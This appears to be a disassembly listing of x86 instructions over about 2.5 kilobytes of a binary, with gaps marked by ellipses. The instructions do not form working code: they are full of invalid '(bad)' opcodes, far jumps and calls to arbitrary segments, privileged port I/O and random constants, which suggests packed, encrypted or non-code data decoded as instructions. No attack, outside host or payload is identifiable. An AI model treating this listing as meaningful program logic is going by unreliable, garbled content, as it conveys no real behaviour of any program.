  4236fe:	in     eax,dx
  4236ff:	and    ebp,esp
  423701:	dec    edx
  423702:	fnstsw WORD PTR [eax+0x9c97c5b]
  423708:	cwde   
  423709:	lea    ecx,[ebx-0x21]
  42370c:	pop    ebp
  42370d:	inc    ebp
  42370e:	push   ebx
  42370f:	shl    esi,cl
  423711:	call   0xd359:0xb633938
  423718:	pop    eax
  423719:	test   bh,al
  42371b:	push   0x7b9025c3
  423720:	loope  0x423788
  423722:	cmp    al,0x9c
  423724:	stc    
  423725:	pop    ss
  423726:	mov    cl,0x45
  423728:	inc    edx
  423729:	in     al,0xe5
  42372b:	and    al,0x9a
  42372d:	pop    edx
  42372e:	mov    BYTE PTR [ebx+0x6f],dl
  423731:	sub    edi,DWORD PTR [eax+ecx*8-0x3c]
  423735:	std    
  423736:	sbb    DWORD PTR [esi],0x2b
  423739:	pop    edx
  42373a:	jmp    0x8ba3:0xdfa94b19
  423741:	cs and al,0xd7
  423744:	push   ds
  423745:	pop    esi
  423746:	inc    edx
  423747:	aaa    
  423748:	cmp    BYTE PTR [eax],ch
  42374a:	or     al,BYTE PTR [eax+0x6f]
  42374d:	mov    edx,0xb4e535d8
  423752:	icebp  
  423753:	pop    es
  423754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423755:	or     DWORD PTR ds:0xe27920af,ebx
  42375b:	cwde   
  42375c:	fisub  DWORD PTR [ecx]
  42375e:	xlat   BYTE PTR ds:[ebx]
  42375f:	in     eax,0x6b
  423761:	popf   
  423762:	jmp    0x42372f
  423764:	xlat   BYTE PTR ds:[ebx]
  423765:	push   eax
  423766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423767:	jb     0x42376f
  423769:	test   DWORD PTR [ecx-0x7d716f81],eax
  42376f:	mov    DWORD PTR [edx],ebx
  423771:	push   eax
  423772:	lods   al,BYTE PTR ds:[esi]
  423773:	aas    
  423774:	loope  0x4237cb
  423776:	jmp    0x1349ad64
  42377b:	and    al,0xd
  42377d:	xchg   ecx,eax
  42377e:	push   0xffffffab
  423780:	mov    edx,0xdb0827ec
  423785:	jne    0x423743
  423787:	xor    bl,bl
  423789:	(bad)  
  42378a:	push   ds
  42378b:	pushf  
  42378c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42378d:	jns    0x423778
  42378f:	sbb    eax,0xcbf9a9da
  423794:	iret   
  423795:	and    DWORD PTR [ebx],esi
  423797:	xrelease xchg DWORD PTR [esi+0x11],edi
  42379b:	scas   al,BYTE PTR es:[edi]
  42379c:	cmp    al,0xef
  42379e:	jbe    0x423729
  4237a0:	jle    0x42381d
  4237a2:	aas    
  4237a3:	inc    ebx
  4237a4:	mov    bl,0x48
  4237a6:	rcl    DWORD PTR [ebp+0x4e8a7899],cl
  4237ac:	retf   0x7c7e
  4237af:	push   edi
  4237b0:	adc    esp,ebp
  4237b2:	in     eax,0xb
  4237b4:	pop    es
  4237b5:	jmp    FWORD PTR [ebp+0x53a89fe8]
  4237bb:	inc    ebx
  4237bc:	out    dx,eax
  4237bd:	adc    al,0x65
  4237bf:	pop    esp
  4237c0:	and    al,0x4a
  4237c2:	xchg   ebx,eax
  4237c3:	cdq    
  4237c4:	mov    ds:0xafd1e202,eax
  4237c9:	dec    ebp
  4237ca:	xor    eax,0x23377784
  4237cf:	sub    BYTE PTR [ebx+ecx*1],cl
  4237d2:	ror    DWORD PTR [eax+0x4a0384cf],1
  4237d8:	scas   eax,DWORD PTR es:[edi]
  4237d9:	imul   edx,DWORD PTR [ebp-0x69e33e4],0x67
  4237e0:	cmp    BYTE PTR [ebx],dh
  4237e2:	push   edx
  4237e3:	cld    
  4237e4:	es (bad) 
  4237e7:	adc    ah,BYTE PTR [esi]
  4237e9:	xor    BYTE PTR [ecx+0xac923a],0x0
	...
  423854:	add    BYTE PTR [eax],al
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0xe7283db4
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	test   BYTE PTR [ebx],0xda
  423871:	test   bl,al
  423873:	add    eax,0xd98318ce
  423878:	ret    
  423879:	pop    es
  42387a:	popf   
  42387b:	ror    DWORD PTR [edx+0x52f0996b],1
  423881:	cld    
  423882:	cmc    
  423883:	dec    ebp
  423884:	lahf   
  423885:	ss and al,0x9
  423888:	cdq    
  423889:	add    al,0x4a
  42388b:	jecxz  0x4238e5
  42388d:	sar    dh,cl
  42388f:	sbb    BYTE PTR [edi+0x710da662],ah
  423895:	call   ebx
  423897:	out    0x8b,eax
  423899:	and    al,0xf2
  42389b:	add    BYTE PTR [edi+0xa],cl
  42389e:	stos   DWORD PTR es:[edi],eax
  42389f:	and    al,dh
  4238a1:	lahf   
  4238a2:	sbb    eax,0x3fb9d372
  4238a7:	mov    DWORD PTR [ebx+0x29],ebp
  4238aa:	je     0x4238c5
  4238ac:	adc    DWORD PTR [edx+0x3b],edi
  4238af:	jmp    FWORD PTR [edx+0x4a41f8]
  4238b5:	cmp    dl,BYTE PTR [eax]
  4238b7:	(bad)  
  4238b8:	pop    es
  4238b9:	sti    
  4238ba:	xor    eax,0xc4720039
  4238bf:	sbb    edx,DWORD PTR [esi-0x7a824f09]
  4238c5:	xor    al,0xc1
  4238c7:	clc    
  4238c8:	add    ebx,0xffffffba
  4238cb:	fmul   QWORD PTR [ebx+0x20]
  4238ce:	cmp    BYTE PTR [edi+eax*2],bh
  4238d1:	call   0xf9f6:0xfcbab646
  4238d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238d9:	cld    
  4238da:	sbb    ecx,0x6f
  4238dd:	std    
  4238de:	fadd   QWORD PTR [edx]
  4238e0:	cli    
  4238e1:	test   BYTE PTR [ecx],ch
  4238e3:	aad    0x65
  4238e5:	pop    ebx
  4238e6:	outs   dx,DWORD PTR ds:[esi]
  4238e7:	xor    BYTE PTR [ebx-0x5d6989aa],bl
  4238ed:	sub    eax,DWORD PTR [ecx+0xefe5eb2]
  4238f3:	add    DWORD PTR [ebx+0x25],edx
  4238f6:	pop    ss
  4238f7:	stos   DWORD PTR es:[edi],eax
  4238f8:	mov    eax,0x3b66c498
  4238fd:	retf   
  4238fe:	sbb    al,0xd5
  423900:	cld    
  423901:	mov    ebx,0x3108a332
  423906:	cmp    al,0x40
  423908:	jb     0x423921
  42390a:	adc    al,0x9e
  42390c:	and    al,BYTE PTR [ecx]
  42390e:	cs adc al,0x91
  423911:	mov    ebp,0xbbd1562f
  423916:	int3   
  423917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423918:	mov    al,ds:0x42d8dc4a
  42391d:	fstp   TBYTE PTR [edx]
  42391f:	cmp    DWORD PTR [esi-0x4e34346e],esi
  423925:	mov    esp,0x103cda40
  42392a:	jo     0x423948
  42392c:	sub    ah,0x54
  42392f:	xchg   dl,dh
  423931:	pop    eax
  423932:	push   esp
  423933:	sbb    esp,DWORD PTR [edx+eiz*8]
  423936:	lods   al,BYTE PTR ds:[esi]
  423937:	xchg   BYTE PTR [ecx],bh
  423939:	and    al,0x64
  42393b:	ret    0x50c4
  42393e:	fstp   st(1)
  423940:	mov    edx,0x688887eb
  423945:	xchg   ebx,eax
  423946:	fwait
  423947:	pop    esp
  423948:	jl     0x42399c
  42394a:	add    edx,0xffffffc9
  42394d:	sbb    al,0xa0
  42394f:	fs ss ror dh,cl
  423953:	mov    ecx,0x92e479de
  423958:	mov    BYTE PTR [ecx+0x68],ch
  42395b:	push   edi
  42395c:	into   
  42395d:	xchg   ebx,eax
  42395f:	jns    0x4239be
  423961:	pusha  
  423962:	iret   
  423963:	xchg   ebp,eax
  423964:	and    DWORD PTR [edi-0x4afd34e2],0xffffffa8
  42396b:	test   eax,0x7cee
	...
  4239d4:	add    BYTE PTR [eax],al
  4239d6:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0x6c3a2bbd
  4239e4:	stc    
  4239e5:	packuswb mm7,QWORD PTR [esi+0x1]
  4239e9:	add    BYTE PTR [eax],al
  4239eb:	add    DWORD PTR [eax],eax
  4239ed:	add    BYTE PTR [eax-0x8],al
  4239f0:	(bad)  
  4239f1:	mov    eax,ds:0xe83527c7
  4239f6:	lahf   
  4239f7:	bound  edi,QWORD PTR [eax+0x5cc6df3f]
  4239fd:	mov    edx,0x67e93091
  423a02:	dec    ebp
  423a03:	inc    ebp
  423a04:	add    al,cl
  423a06:	mov    eax,ds:0x964d11ea
  423a0b:	es ds mov dl,0xd5
  423a0f:	mov    ah,0x5f
  423a11:	ins    DWORD PTR es:[edi],dx
  423a12:	pop    ecx
  423a13:	addr16 iret 
  423a15:	jmp    0xd5a8:0xff178124
  423a1c:	fidivr DWORD PTR [ecx+0x6dc05907]
  423a22:	pop    edi
  423a23:	and    bl,BYTE PTR [ecx-0x648c32ae]
  423a29:	mov    WORD PTR [ebp+0x60646d7e],cs
  423a2f:	(bad)  
  423a30:	aas    
  423a31:	xchg   esi,eax
  423a32:	jge    0x423a16
  423a34:	adc    DWORD PTR [ecx+0x25],ebx
  423a37:	sbb    al,0xe0
  423a39:	cmp    eax,0x6330107a
  423a3e:	stos   DWORD PTR es:[edi],eax
  423a3f:	pop    ecx
  423a40:	xchg   esi,eax
  423a41:	jg     0x423aab
  423a43:	add    bh,al
  423a45:	call   0x43bd1240
  423a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a4b:	shl    DWORD PTR [eax-0x7b258e5d],0xd9
  423a52:	(bad)  
  423a53:	in     al,dx
  423a54:	push   ebp
  423a55:	pcmpgtd mm0,QWORD PTR [eax+0x47]
  423a59:	push   ebx
  423a5a:	pop    ebp
  423a5b:	pop    ecx
  423a5c:	pushf  
  423a5d:	push   cs
  423a5e:	pop    ebp
  423a5f:	sub    BYTE PTR [edx+0xa],dh
  423a62:	int    0x99
  423a64:	mov    bl,0xee
  423a66:	enter  0xe24c,0x6
  423a6a:	add    ecx,DWORD PTR [ebx-0xcb37b52]
  423a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a71:	or     dl,BYTE PTR [esi]
  423a73:	inc    esi
  423a74:	mov    ah,0x7
  423a76:	xchg   ebx,eax
  423a77:	mov    al,ds:0xafaf4ef6
  423a7c:	mov    edi,0xd8ead05a
  423a81:	fiadd  WORD PTR [ebx+0x7301be4c]
  423a87:	sti    
  423a88:	ja     0x423ae0
  423a8a:	scas   eax,DWORD PTR es:[edi]
  423a8b:	stos   DWORD PTR es:[edi],eax
  423a8c:	xchg   ebp,eax
  423a8d:	scas   al,BYTE PTR es:[edi]
  423a8e:	std    
  423a8f:	sbb    DWORD PTR [ebp+eiz*1+0x8c472c3],ebx
  423a96:	addr16 xor cl,0x10
  423a9a:	rcr    esp,0x67
  423a9d:	pop    ebp
  423a9e:	hlt    
  423a9f:	inc    eax
  423aa0:	lahf   
  423aa1:	push   cs
  423aa2:	retf   0x9a86
  423aa5:	xchg   DWORD PTR [eax+0x13f68451],ebp
  423aab:	leave  
  423aac:	inc    esp
  423aad:	sub    dl,BYTE PTR ds:0x2b214ffd
  423ab3:	inc    esp
  423ab4:	aas    
  423ab5:	jp     0x423a67
  423ab7:	lods   al,BYTE PTR ds:[esi]
  423ab8:	pop    ebp
  423ab9:	dec    ebp
  423aba:	stos   BYTE PTR es:[edi],al
  423abb:	pop    ebx
  423abc:	sub    bl,BYTE PTR [ebp-0x290c30b4]
  423ac2:	std    
  423ac3:	sub    ecx,ecx
  423ac5:	fmulp  st(0),st
  423ac7:	clc    
  423ac8:	xor    BYTE PTR [ebx+0x60],dh
  423acb:	cmp    al,0x59
  423acd:	dec    eax
  423ace:	jl     0x423add
  423ad0:	mov    ah,0x2d
  423ad2:	jnp    0x423aa7
  423ad4:	dec    ebp
  423ad5:	jmp    DWORD PTR [eax+0x4e]
  423ad8:	adc    eax,0xd16a6741
  423add:	pop    ecx
  423ade:	inc    ebp
  423adf:	mov    ah,ah
  423ae1:	int3   
  423ae2:	sub    eax,0x5473877f
  423ae7:	xchg   esp,eax
  423ae8:	xchg   edi,eax
  423ae9:	stc    
  423aea:	mov    al,0x87
  423aec:	push   ebx
  423aed:	mov    WORD PTR [eax],es
	...
  423b53:	add    BYTE PTR [eax],al
  423b55:	add    BYTE PTR [eax],dh
  423b57:	cmp    eax,0xdf7d9f75
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	sub    al,0x35
  423b64:	push   ebp
  423b65:	popf   
  423b66:	addr16 jg 0x423b6a
  423b69:	add    BYTE PTR [eax],al
  423b6b:	add    DWORD PTR [eax],eax
  423b6d:	add    ch,ch
  423b6f:	xor    BYTE PTR [ebx+0x228d39ab],dl
  423b75:	sub    eax,0xc98b594b
  423b7a:	mov    al,0x54
  423b7c:	cld    
  423b7d:	out    dx,eax
  423b7e:	stos   BYTE PTR es:[edi],al
  423b7f:	inc    esp
  423b80:	jmp    0x423ba3
  423b82:	mov    dl,BYTE PTR [edi]
  423b84:	push   edi
  423b85:	xchg   ebx,eax
  423b86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b87:	or     cl,0xf3
  423b8a:	xchg   esp,eax
  423b8b:	sub    al,0x37
  423b8d:	push   edi
  423b8e:	jo     0x423b1b
  423b90:	lahf   
  423b91:	jne    0x423b14
  423b93:	sub    cl,ah
  423b95:	xchg   edi,eax
  423b96:	out    dx,eax
  423b97:	leave  
  423b98:	push   esi
  423b99:	cmp    eax,0xe6f1204a
  423b9e:	push   es
  423b9f:	inc    ebp
  423ba0:	xor    bh,BYTE PTR ds:0xcaeaf9a5
  423ba6:	and    dh,cl
  423ba8:	outs   dx,BYTE PTR ds:[esi]
  423ba9:	into   
  423baa:	icebp  
  423bab:	push   ebp
  423bac:	out    0x16,al
  423bae:	repz retf 
  423bb0:	dec    esi
  423bb1:	mov    WORD PTR [ecx],gs
  423bb3:	mov    ecx,0x98a350fe
  423bb8:	inc    ecx
  423bb9:	scas   eax,DWORD PTR es:[edi]
  423bba:	test   DWORD PTR [edi],edi
  423bbc:	arpl   WORD PTR [ebp-0x65],bx
  423bbf:	xchg   ebp,eax
  423bc0:	mov    ds:0xe8c29d54,al
  423bc5:	popa   
  423bc6:	test   BYTE PTR [edi+0x2d],bl
  423bc9:	repnz adc eax,0xb249fbe0
  423bcf:	call   0xb434:0x8645e054
  423bd6:	mov    gs,WORD PTR [ebx-0x26]
  423bd9:	loope  0x423c28
  423bdb:	sub    ah,BYTE PTR [esi+0x71680be3]
  423be1:	cwde   
  423be2:	jle    0x423c2a
  423be4:	or     esi,DWORD PTR [esi+0x6]
  423be7:	and    eax,0x1c0c1ad7
  423bec:	into   
  423bed:	and    eax,0x70607546
  423bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bf3:	loopne 0x423c12
  423bf5:	mov    ds:0x419a3dd5,al
  423bfa:	add    DWORD PTR [edi+0x5d],esp
  423bfd:	leave  
  423bfe:	mov    esp,0xdcd4b781
  423c03:	pop    eax
  423c04:	jge    0x423bd3
  423c06:	inc    ebx
  423c07:	push   es
  423c08:	sti    
  423c09:	push   ss
  423c0a:	adc    esi,DWORD PTR [ecx]
  423c0c:	jp     0x423c46
  423c0e:	jns    0x423c62
  423c10:	(bad)  
  423c11:	jg     0x423c6a
  423c13:	dec    ebp
  423c14:	bnd ret 
  423c16:	inc    ebx
  423c17:	xchg   esi,eax
  423c18:	leave  
  423c19:	and    ebx,DWORD PTR [ecx-0x68]
  423c1c:	das    
  423c1d:	cmp    al,0x73
  423c1f:	or     al,0xbd
  423c21:	xor    al,0x5a
  423c23:	in     eax,0x47
  423c25:	push   edi
  423c26:	sar    ecx,0xe7
  423c29:	jp     0x423bd7
  423c2b:	retf   
  423c2c:	aam    0xad
  423c2e:	or     ah,bl
  423c30:	call   DWORD PTR [ebp-0x78]
  423c33:	push   edi
  423c34:	add    cl,bl
  423c36:	mov    ds:0x202d7d60,al
  423c3b:	retf   0x239a
  423c3e:	fs mov ch,0x77
  423c41:	and    DWORD PTR [eax-0x2e85b736],ebp
  423c47:	xlat   BYTE PTR ds:[ebx]
  423c48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c49:	lds    ebp,FWORD PTR [ecx-0x11e41c3b]
  423c4f:	fisttp WORD PTR [edx-0x164e6441]
  423c55:	push   0x29546049
  423c5a:	or     al,0xdd
  423c5c:	mov    ecx,0x2a6ac335
  423c61:	pop    ecx
  423c62:	jo     0x423c84
  423c64:	mov    ecx,0xaa3f531
  423c69:	jp     0x423c4a
  423c6b:	mov    dh,0xd
  423c6d:	mov    WORD PTR [eax],es
	...
  423cd3:	add    BYTE PTR [eax],al
  423cd5:	add    ch,bh
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax-0x4dbb99e9]
  423ce3:	pop    ecx
  423ce4:	out    dx,al
  423ce5:	stc    
  423ce6:	add    BYTE PTR [bx+di],0x0
  423cea:	add    BYTE PTR [ecx],al
  423cec:	add    BYTE PTR [eax],al
  423cee:	xchg   edx,eax
  423cef:	mov    ebx,0x648123c3
  423cf4:	stos   BYTE PTR es:[edi],al
  423cf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cf6:	cmp    ebp,DWORD PTR [esi]
  423cf8:	mov    ds:0xa666285a,al
  423cfd:	add    edi,edi
  423cff:	pop    ds
  423d00:	dec    ebx
  423d01:	add    al,0x4d
  423d03:	stc    
  423d04:	and    eax,0x8250f1fd
  423d09:	rol    DWORD PTR [eax],cl
  423d0b:	xchg   edi,eax
  423d0c:	neg    BYTE PTR [ebp+0x7b9e909f]
  423d12:	pop    ecx
  423d13:	or     BYTE PTR [ecx-0x2e363b31],bh
  423d19:	jnp    0x423d8b
  423d1b:	push   esi
  423d1c:	mov    bh,0x75
  423d1e:	dec    ecx
  423d1f:	push   ss
  423d20:	test   BYTE PTR [ebp+0x36],ch
  423d23:	mov    BYTE PTR [edx],dh
  423d25:	(bad)  
  423d26:	pop    ss
  423d27:	mov    ecx,0x3e4333ec
  423d2c:	add    ch,bl
  423d2e:	div    DWORD PTR [ebp-0x2b6c1fa]
  423d34:	lods   al,BYTE PTR ds:[esi]
  423d35:	loop   0x423cc3
  423d37:	int3   
  423d38:	push   esp
  423d39:	and    dl,cl
  423d3b:	enter  0x5b4b,0x7d
  423d3f:	mov    ds:0x98c33c90,al
  423d44:	mov    edi,0xc421837a
  423d49:	retf   0xffad
  423d4c:	push   ecx
  423d4d:	xor    DWORD PTR [ebp+edi*2+0x71],eax
  423d51:	pop    ds
  423d52:	or     DWORD PTR [esi+0x706511ce],edi
  423d58:	shr    DWORD PTR [ecx],1
  423d5a:	aad    0x8f
  423d5c:	inc    ebx
  423d5d:	add    al,0x86
  423d5f:	int3   
  423d60:	jle    0x423d05
  423d62:	mov    bh,dh
  423d64:	and    eax,0x2cd7e403
  423d69:	cmp    eax,DWORD PTR [ebp-0x1]
  423d6c:	test   al,0x90
  423d6e:	lds    ecx,FWORD PTR [edx-0x1be12e37]
  423d74:	pushf  
  423d75:	xlat   BYTE PTR ds:[ebx]
  423d76:	lods   al,BYTE PTR ds:[esi]
  423d77:	sub    ebp,DWORD PTR [ebx+ebp*8+0x4d]
  423d7b:	pusha  
  423d7c:	iret   
  423d7d:	or     al,0x79
  423d7f:	hlt    
  423d80:	pop    ebx
  423d81:	dec    esi
  423d82:	and    al,0xd6
  423d84:	cmp    DWORD PTR [edx+esi*8],ecx
  423d87:	xor    eax,0xed06b876
  423d8c:	jp     0x423dc0
  423d8e:	xor    DWORD PTR ds:0x7e044b5c,edi
  423d94:	fist   WORD PTR [eax-0x81f7a88]
  423d9a:	cmp    DWORD PTR [esi-0x5d7fb716],0x3640fe75
  423da4:	out    0x9a,eax
  423da6:	(bad)  
  423da8:	call   0x128176a2
  423dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dae:	daa    
  423daf:	(bad)
  423db3:	aam    0x3f
  423db5:	out    dx,eax
  423db6:	ins    DWORD PTR es:[edi],dx
  423db7:	adc    dl,BYTE PTR [ecx+0x1c]
  423dba:	std    
  423dbb:	sti    
  423dbc:	cwde   
  423dbd:	jl     0x423ded
  423dbf:	inc    BYTE PTR [edx+0x57]
  423dc2:	cmp    DWORD PTR [edx],edx
  423dc4:	out    dx,al
  423dc5:	ins    BYTE PTR es:[edi],dx
  423dc6:	sub    al,0x77
  423dc8:	ss xchg ecx,eax
  423dca:	pop    edi
  423dcb:	popa   
  423dcc:	sbb    DWORD PTR [ecx-0x6b895637],ecx
  423dd2:	icebp  
  423dd3:	ret    0x7803
  423dd6:	jo     0x423da9
  423dd8:	mov    edx,0xbfd7892b
  423dde:	sub    BYTE PTR [eax],bh
  423de0:	cs xor eax,0x72fe0a42
  423de6:	sub    DWORD PTR [edi+esi*2-0x5e],0x40
  423deb:	push   ss
  423dec:	scas   al,BYTE PTR es:[edi]
  423ded:	loopne 0x423def
	...
  423e53:	add    BYTE PTR [eax],al
  423e55:	add    BYTE PTR [edx-0xa],ah
  423e58:	xchg   DWORD PTR [ecx],ecx
  423e5a:	xchg   edi,eax
  423e5b:	jns    0x423e4b
  423e5d:	jmp    DWORD PTR [edi]
  423e5f:	mov    DWORD PTR [eax+0x7b8f36d2],esp
  423e65:	aad    0x67
  423e67:	add    DWORD PTR [ecx],0x10000
  423e6d:	add    BYTE PTR [eax],ch
  423e6f:	dec    ebx
  423e70:	imul   ecx,DWORD PTR [ecx+ebx*2],0x63
  423e74:	outs   dx,DWORD PTR ds:[esi]
  423e75:	mov    dl,0x4a
  423e77:	xchg   ebp,eax
  423e78:	(bad)  
  423e79:	jmp    0x325c:0x1b7986f3
  423e80:	(bad)  
  423e81:	mov    eax,ds:0xcfb78d05
  423e86:	stos   BYTE PTR es:[edi],al
  423e87:	pop    ebp
  423e88:	jne    0x423efd
  423e8a:	push   ds
  423e8b:	data16 and BYTE PTR [esp+ebp*2],0x4e
  423e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e91:	mov    al,ds:0x117e688f
  423e96:	imul   eax,DWORD PTR [ebx],0xffffffd3
  423e99:	mov    ebx,0xfb97c7b2
  423e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e9f:	add    eax,0x6eed5100
  423ea4:	sub    ah,0x31
  423ea7:	repz jne 0x423e53
  423eaa:	or     bh,dl
  423eac:	inc    esp
  423ead:	inc    eax
  423eae:	adc    DWORD PTR [ebp+eiz*2+0x739819c],ecx
  423eb5:	pop    es
  423eb6:	mov    eax,ds:0xa5ddb0d9
  423ebb:	sub    edx,DWORD PTR [edi+0x63]
  423ebe:	gs (bad) 
  423ec1:	stos   DWORD PTR es:[edi],eax
  423ec2:	ds and bh,al
  423ec5:	adc    BYTE PTR [edx],dl
  423ec7:	xchg   edx,eax
  423ec8:	dec    eax
  423ec9:	retf   0xc5ec
  423ecc:	gs dec edi
  423ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ecf:	addr16 icebp 
  423ed1:	sbb    al,0x13
  423ed3:	or     al,0x79
  423ed5:	test   dl,0x2b
  423ed8:	mov    ah,0xd9
  423eda:	push   edx
  423edb:	lods   al,BYTE PTR ds:[esi]
  423edc:	mov    esp,DWORD PTR [edx]
  423ede:	loop   0x423e74
  423ee0:	iret   
  423ee1:	cli    
  423ee2:	xlat   BYTE PTR ds:[ebx]
  423ee3:	push   edx
  423ee4:	adc    cl,BYTE PTR [eax-0x7d7d13ae]
  423eea:	lds    ebp,FWORD PTR [edi]
  423eec:	sub    ebp,esp
  423eee:	loopne 0x423ec1
  423ef0:	add    dl,bh
  423ef2:	mov    bh,BYTE PTR [eax+edx*4-0x8425d37]
  423ef9:	push   ebp
  423efa:	push   ss
  423efb:	aam    0x62
  423efd:	dec    esi
  423efe:	xor    dl,dl
  423f00:	sub    DWORD PTR [eax+0x7d],edx
  423f03:	mov    ebp,0x5dd2fd5f
  423f08:	mov    ch,0x13
  423f0a:	mov    edx,0x51b462c8
  423f0f:	sub    eax,0xe0e9c4c8
  423f14:	out    0x72,eax
  423f16:	dec    ecx
  423f17:	xchg   bh,dh
  423f19:	jecxz  0x423f56
  423f1b:	push   esp
  423f1c:	mov    edi,DWORD PTR [edx+0x105b2d2c]
  423f22:	push   esi
  423f23:	jae    0x423f87
  423f25:	pop    eax
  423f26:	fdivr  st,st(4)
  423f28:	jno    0x423eaf
  423f2a:	sbb    BYTE PTR [esi*4+0x5e87cf09],ah
  423f31:	retf   
  423f32:	mov    bl,0x5b
  423f34:	repnz es nop
  423f37:	mov    ecx,0xc15b44e9
  423f3c:	dec    esi
  423f3d:	jecxz  0x423ebf
  423f3f:	mov    al,0x1
  423f41:	mov    dl,0x83
  423f43:	pop    esp
  423f44:	scas   al,BYTE PTR es:[edi]
  423f45:	fidivr DWORD PTR [ebp-0xc39b705]
  423f4b:	mov    edx,0x54f40685
  423f50:	mov    eax,ds:0x907303d2
  423f55:	(bad)  [eax+0x5]
  423f58:	xchg   esp,eax
  423f59:	aad    0x3e
  423f5b:	imul   esi,edi,0x6dbceff7
  423f61:	and    eax,0x48a70ff6
  423f66:	mov    bh,0xd1
  423f68:	mov    ds:0x12fbc499,eax
  423f6d:	leave  
	...
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	mov    BYTE PTR [eax],ah
  423fe4:	pushf  
  423fe5:	dec    ecx
  423fe6:	add    BYTE PTR [bx+di],0x0
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	pop    esp
  423fef:	test   BYTE PTR [esi+ebp*8+0x6a],dl
  423ff3:	cmp    bl,al
  423ff5:	in     al,dx
  423ff6:	sbb    edx,DWORD PTR [eax]
  423ff8:	lods   eax,DWORD PTR ds:[esi]
  423ff9:	(bad)  
  423ffb:	fcomi  st,st(1)
  423ffd:	pop    ds
  423ffe:	inc    edx
  423fff:	jb     0x42405c
  424001:	call   0x3404d449
  424006:	and    ebp,DWORD PTR ds:0x29845f1e
  42400c:	call   DWORD PTR [ecx]
  42400e:	mov    ch,0x76
  424010:	pop    edx
  424011:	inc    ecx
  424012:	and    DWORD PTR [edx-0x13],esi
  424015:	add    BYTE PTR [edi-0x64ee9bdd],ah
  42401b:	addr16 adc eax,0x442df08
  424021:	dec    edi
  424022:	pop    ss
  424023:	cwde   
  424024:	inc    esi
  424025:	shr    BYTE PTR [ecx-0x3642d48d],1
  42402b:	add    al,0x56
  42402d:	mov    esp,0xdc4b644c
  424032:	mov    edx,0xf1da9e8a
  424037:	popf   
  424038:	xor    al,0x7c
  42403a:	xchg   ebx,eax
  42403b:	push   0xfffffff6
  42403d:	push   ss
  42403e:	jl     0x424025
  424040:	push   edx
  424041:	loopne 0x42403b
  424043:	mov    cl,BYTE PTR [eax]
  424045:	xchg   ebp,eax
  424046:	push   ebp
  424047:	call   0xd8ef8063
  42404c:	mov    ds:0x4ea2d7f0,al
  424051:	in     eax,dx
  424052:	outs   dx,DWORD PTR ds:[esi]
  424053:	pop    edi
  424054:	cmp    al,0x46
  424056:	pop    esp
  424057:	add    DWORD PTR [ebx+esi*4],ecx
  42405a:	or     bl,BYTE PTR [edx+0x4c]
  42405d:	nop
  42405e:	add    ah,0x0
  424061:	adc    DWORD PTR [esi],edx
  424063:	je     0x4240c6
  424065:	inc    esi
  424066:	aas    
  424067:	mov    bh,0x64
  424069:	mov    ah,0x18
  42406b:	mov    bp,0x5766
  42406f:	fdivr  DWORD PTR ds:0x13ed3115
  424075:	sahf   
  424076:	xchg   esp,eax
  424077:	push   0x64
  424079:	adc    DWORD PTR [edi+ecx*4],esi
  42407c:	adc    edx,DWORD PTR [edx+ecx*2]
  42407f:	test   ah,ch
  424081:	frstor [edx+ebx*1-0x39]
  424085:	stc    
  424086:	loop   0x42402b
  424088:	sub    cl,BYTE PTR [edx]
  42408a:	inc    esp
  42408b:	mov    cl,0xa3
  42408d:	and    DWORD PTR [ebx-0x4b64e3d9],esp
  424093:	inc    eax
  424094:	xor    bl,BYTE PTR [esi+edi*4]
  424097:	jg     0x424113
  424099:	mov    bh,al
  42409b:	cs loop 0x42404c
  42409e:	pushf  
  42409f:	push   esp
  4240a0:	sbb    DWORD PTR [edi+0x4e],ebx
  4240a3:	lods   al,BYTE PTR ds:[esi]
  4240a4:	das    
  4240a5:	rol    dl,1
  4240a7:	mul    edi
  4240a9:	push   0x5e
  4240ab:	pop    es
  4240ac:	push   ds
  4240ad:	push   0xffffff94
  4240af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240b0:	(bad)  
  4240b1:	cdq    
  4240b2:	int3   
  4240b3:	jne    0x424085
  4240b5:	mov    edi,0x94b54238
  4240ba:	inc    ebp
  4240bb:	xchg   esi,eax
  4240bc:	retf   0xccbd
  4240bf:	mov    esp,0x305ebb51
  4240c4:	cld    
  4240c5:	push   0xffffffdb
  4240c7:	fwait
  4240c8:	cmp    edi,ebp
  4240ca:	jmp    0xe55f:0xd82cb413
  4240d1:	test   al,0xd6
  4240d3:	mov    ds:0x8f72cf89,al
  4240d8:	adc    al,0x84
  4240da:	into   
  4240db:	adc    ebx,DWORD PTR [esi-0x478044cc]
  4240e1:	jge    0xe64bb915
